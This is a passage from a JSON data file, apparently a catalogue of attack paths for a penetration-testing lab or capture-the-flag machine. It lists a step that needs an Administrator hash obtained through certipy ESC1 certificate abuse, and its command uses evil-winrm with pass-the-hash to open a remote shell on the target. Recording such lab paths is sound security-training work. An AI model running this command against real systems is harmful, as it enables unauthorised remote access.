      "requires":"Administrator hash from certipy ESC1",
      "pivot":"Same network",
      "path_ids":["path-authority-escapetwo"],
      "commands":[
        "evil-winrm -i 10.10.11.51 -u Administrator -H '<ntlm_hash>'"
      ]
    }
  ],

